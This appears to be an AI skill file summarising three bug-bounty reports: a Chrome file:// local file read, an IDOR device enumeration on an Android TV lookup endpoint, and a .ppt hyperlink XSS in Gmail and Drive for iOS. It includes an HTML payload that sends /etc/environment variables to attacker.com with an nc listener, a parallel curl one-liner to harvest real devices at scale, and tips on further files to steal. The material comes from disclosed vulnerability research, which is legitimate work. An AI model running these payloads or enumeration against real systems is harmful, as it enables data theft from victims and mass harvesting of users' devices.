---
name: bughunters-mobile-misc
description: 'Personal Google VRP reports by omespino — mobile and desktop miscellaneous findings. Local file read via Chrome file:// (file:///etc/environment has JS-compatible VAR="value" syntax, vars accessible in global scope). No rate limit + IDOR sequential on Android TV setup/lookup endpoint (seq + xargs -P20 parallel enumeration, ~900 devices/10K requests). XSS via PowerPoint 97-2003 javascript: hyperlink in Gmail iOS and Google Drive iOS (must be .ppt not .pptx). Spanish triggers — "chrome file://", "android tv idor", "powerpoint xss ios", "gmail ios xss", "drive ios xss", "ppt xss", "file:// chrome vulnerabilidad", "android tv enumeration", "lookup android tv".'
---

## Reports: Mobile/Desktop Misc Findings (omespino)

---

### Report 10 — Local file read via Chrome file:// (Linux)

**Target:** Google Chrome 92.0.4515.159 (Linux)

**Why it works:** `/etc/environment` has `VAR="value"` format → valid JS → Chrome loads it as script → vars in global scope.

```html
<script src="file:///etc/environment"></script>
<img src="" onerror="document.location='http://attacker.com/?path='+PATH">
```

**Exfiltration:**
```bash
sudo nc -l -p 80
# Receive: ?path=/usr/local/sbin:...&java_home=/usr/lib/jvm/...
```

**Other Linux files with JS-compatible format:** `~/.bashrc`, `/etc/profile`, app configs with `KEY="value"` syntax.
**Requirement:** victim opens malicious HTML locally in Chrome (phishing, USB drop, email attachment).

---

### Report 15 — IDOR sequential + no rate limit on Android TV device lookup

**Target:** `https://www.android.com/tv/setup/lookup?dc={}`

**One-liner enumeration:**
```bash
time seq -w 0 009999 | xargs -I {} -P20 curl -s \
  "https://www.android.com/tv/setup/lookup?dc={}" \
  | tr '&' '\n' | grep device | tee android_tvs.txt
```
- `-P20` → 20 parallel requests
- ~900 devices per 10K requests (~9% hit rate) in ~3 minutes

**Scalability:**
| Requests | Estimated devices | Approx time |
|---|---|---|
| 10,000 | ~900 | 3 min |
| 100,000 | ~9,000 | 30 min |
| 1,000,000 | ~90,000 | ~5 hrs |

**Indicators of enumerable endpoints:** single-field numeric params, zero-padded codes, no rate limit, responses vary "found" vs "not found".

---

### Report 5 — XSS via PowerPoint 97-2003 in Gmail iOS + Google Drive iOS

**Target:** Gmail iOS v5.0.180121, Google Drive iOS v4.2018.05202

**Technique:** `.ppt` file with hyperlink to `javascript:prompt(document.domain)`.
**Critical:** must be saved as **PowerPoint 97-2003 (.ppt)**, NOT .pptx.

- Gmail: open `.ppt` attachment → click hyperlink → XSS
- Drive: copy from email to Drive → open in Drive iOS → click hyperlink → XSS

**Confirmed pattern across platforms:**
| Target | Format | Program |
|---|---|---|
| Atlassian Confluence | Word 97-2003 (.doc) | BugCrowd — $300 |
| Gmail iOS | PowerPoint 97-2003 (.ppt) | Google VRP |
| Google Drive iOS | PowerPoint 97-2003 (.ppt) | Google VRP |
